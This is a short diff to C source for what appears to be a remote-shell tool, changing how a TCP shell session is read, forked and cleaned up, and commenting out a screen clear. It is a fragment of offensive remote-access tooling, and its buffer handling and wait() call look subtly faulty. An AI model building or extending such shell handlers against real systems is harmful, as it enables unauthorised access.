@@ -116,12 +116,17 @@ static void handle_tcp_shell(int sockfd)
 
    
     /* parent reads from socket */
-    if ((pid = fork()) == 0) {
+    fflush(stdout);
+    if ((pid = fork()) > 0) {
         while (read(sockfd, rbuff, sizeof(rbuff)) > 0) {
             rbuff[strlen(rbuff) + 1] = 0x00;
             fputs(rbuff, stdout);
             xmemset(&rbuff, 0x00, sizeof(rbuff));
         }
+		
+		kill(pid, 9);
+		wait();
+		return;
     }
 
     /* child writes to socket */
@@ -263,8 +268,8 @@ static void connect_tcp_port(packet_t *packet)
 
     /* ok, let's handle our shell session */
     __VERBOSE_GOT_SHELL;
-    sleep(1);
-    xsystem("clear");
+    // sleep(1);
+    // xsystem("clear");
     handle_tcp_shell(packet->cfd);
 
     /* we are done, so we close used descriptors */
